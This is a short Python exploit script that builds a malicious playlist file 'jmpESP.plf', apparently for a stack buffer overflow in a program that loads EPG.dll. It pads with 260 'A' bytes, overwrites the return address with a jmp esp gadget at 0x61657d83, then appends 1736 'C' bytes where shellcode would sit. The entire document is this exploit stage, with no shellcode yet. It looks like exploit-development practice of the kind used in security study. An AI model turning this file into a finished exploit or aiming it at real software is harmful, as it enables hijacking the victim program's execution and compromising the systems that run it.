#!/usr/bin/env python
import struct

filename="jmpESP.plf"
#---------------------------------------------
# 0x61657d83 : jmp esp | EPG.dll
#---------------------------------------------
jmp_esp = struct.pack("<I", 0x61657d83)
buffer = "A"*260 + jmp_esp + "C"*1736
textfile = open(filename, 'w')
textfile.write(buffer)
textfile.close()